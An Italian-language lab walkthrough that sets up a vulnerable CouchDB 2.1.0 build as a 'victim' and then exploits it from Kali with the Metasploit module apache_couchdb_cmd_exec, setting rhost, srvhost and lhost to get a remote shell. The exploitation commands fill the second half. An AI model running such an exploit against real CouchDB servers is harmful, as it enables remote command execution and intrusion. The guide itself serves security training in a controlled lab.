


Sulla vittima è necessario compilare CouchDB versione 2.1.0:
	
1) Download dei codici sorgente al seguente indirizzo 
	https://archive.apache.org/dist/couchdb/source/2.1.0/apache-couchdb-2.1.0.tar.gz

2) Installare le dipendenze dai repository di Debian:
	sudo apt-get install build-essential pkg-config erlang erlang-reltool libicu-dev libmozjs185-dev libcurl4-openssl-dev curl	

3) Scompattare apache-couchdb-2.1.0.tar.gz, posizionarsi nella directory generata ed eseguire i seguenti comandi:

	$ ./configure 

	$ make release

4) Se tutto è andato a buon fine verrà generata la directory rel; spostarsi in rel/couchdb/bin/couchdb; lanciare:
	
	$ ./couchdb 

5) E' necessari impostare un account amministratore generando un nuovo nodo:
	
	collegarsi dal browser all'indirizzo http://127.0.0.1:5984/_utils

	nel menù a sinistra selezionare la voce con la chiave inglese

	aggiungere username e password dell'amministratore che si sta creando

	aggiungere come indirizzo ip quello associato alla macchina dalla rete in cui si trova (ad esempio 192.168.1.140)

Avviare sulla macchina dell'attaccante Kali, con metasploit aggiornato ed eseguire i seguenti comandi:

	$ use exploit/linux/http/apache_couchdb_cmd_exec

	$ set rhost 192.168.x.x (indirizzo ip associato alla macchina della vittima)

	$ check

	> restituirà un messaggio che ci indica se la vittima è vulnerabile o meno all'attacco

	$ set srvhost 192.168.x.x (indirizzo Kali)

	$ set lhost 192.168.x.x (indirizzo Kali)

	$ run

Se l'attacco è andato a buon fine si avrà la shell della vittima 
